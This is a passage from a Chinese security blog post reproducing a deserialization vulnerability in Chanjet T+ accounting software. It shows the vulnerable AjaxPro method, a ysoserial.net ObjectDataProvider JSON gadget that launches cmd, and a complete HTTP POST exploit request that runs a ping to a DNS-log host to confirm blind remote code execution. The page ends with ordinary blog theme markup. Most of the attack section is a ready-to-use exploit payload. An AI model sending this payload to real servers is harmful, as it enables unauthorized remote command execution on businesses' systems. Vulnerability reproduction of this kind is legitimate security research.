+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">AjaxMethod</span>]<br>		<span class="hljs-function"><span class="hljs-keyword">public</span> WarehouseDTO <span class="hljs-title">GetStoreWarehouseByStore</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> storeID</span>)</span><br>		&#123;<br>			IRRAService irraservice = ServiceFactory.getService() <span class="hljs-keyword">as</span> IRRAService;<br>			WarehouseDTO warehouseDTO = <span class="hljs-literal">null</span>;<br>			<span class="hljs-keyword">if</span> (irraservice != <span class="hljs-literal">null</span>)<br>			&#123;<br>				warehouseDTO = irraservice.GetStoreWarehouseByStore(Convert.ToString(storeID));<br>			&#125;<br>			<span class="hljs-keyword">return</span> warehouseDTO;<br>		&#125;<br></code></pre></td></tr></table></figure>
+<p>看不懂，翻看教程<br>简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞<br>使用ysoserial.net工具构造payload（攻击链：ObjectDataProvider）</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp">&#123;<br>    <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;</span>,<br>    <span class="hljs-string">&#x27;MethodName&#x27;</span>:<span class="hljs-string">&#x27;Start&#x27;</span>,<br>    <span class="hljs-string">&#x27;MethodParameters&#x27;</span>:&#123;<br>        <span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>,<br>        <span class="hljs-string">&#x27;$values&#x27;</span>:[<span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;/c calc&#x27;</span>]<br>    &#125;,<br>    <span class="hljs-string">&#x27;ObjectInstance&#x27;</span>:&#123;<span class="hljs-string">&#x27;$type&#x27;</span>:<span class="hljs-string">&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942202542-8dba11d0-defe-449e-82be-85eacc0ca701.png#averageHue=%23171717&clientId=uaee44d69-b62d-4&from=paste&height=303&id=u9d405401&originHeight=455&originWidth=1752&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66428&status=done&style=none&taskId=u61120e37-278d-40d5-b9cb-4499e09ba3b&title=&width=1168" srcset="/img/loading.gif" lazyload alt="image.png"><br>无回显，ping dnslog。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.186</span>:<span class="hljs-number">8080</span><br>Content-Length: <span class="hljs-number">613</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>X-Ajaxpro-Method: GetStoreWarehouseByStore<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: http:<span class="hljs-comment">//192.168.150.186:8080</span><br>Content-Type: application/json<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">103.0</span><span class="hljs-number">.5060</span><span class="hljs-number">.53</span> Safari/<span class="hljs-number">537.36</span><br><br>&#123;<br>  <span class="hljs-string">&quot;storeID&quot;</span>:&#123;<br> <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>,<br>    <span class="hljs-string">&quot;MethodName&quot;</span>:<span class="hljs-string">&quot;Start&quot;</span>,<br>    <span class="hljs-string">&quot;ObjectInstance&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>,<br>        <span class="hljs-string">&quot;StartInfo&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;__type&quot;</span>:<span class="hljs-string">&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>,<br>            <span class="hljs-string">&quot;FileName&quot;</span>:<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;Arguments&quot;</span>:<span class="hljs-string">&quot;/c ping d6k1otxxiadnfy2mqzxg6o1uelkc81.oastify.com&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942248475-f820a2f1-37e8-46d3-9470-f24e3b3b63e3.png#averageHue=%23fbfbfb&clientId=uaee44d69-b62d-4&from=paste&height=649&id=ub678b10c&originHeight=974&originWidth=2078&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=213306&status=done&style=none&taskId=u5b45e4b4-819c-4a39-ba4f-e40430f94d5&title=&width=1385.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692942257933-90a406a9-b5e9-4af1-942d-b8f7c073a769.png#averageHue=%23f6f3f1&clientId=uaee44d69-b62d-4&from=paste&height=685&id=u557d4bab&originHeight=1028&originWidth=1268&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=80696&status=done&style=none&taskId=u1d6da6af-3d70-48e0-83d0-ce5ec567734&title=&width=845.3333333333334" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Net/" class="category-chain-item">Net</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>畅捷通漏洞复现</div>
+      <div>http://example.com/2023/04/13/畅捷通T漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/07/%E7%A6%85%E9%81%93%E6%BC%8F%E6%B4%9E/" title="禅道研发项目管理系统命令注">
+                        <span class="hidden-mobile">禅道研发项目管理系统命令注</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
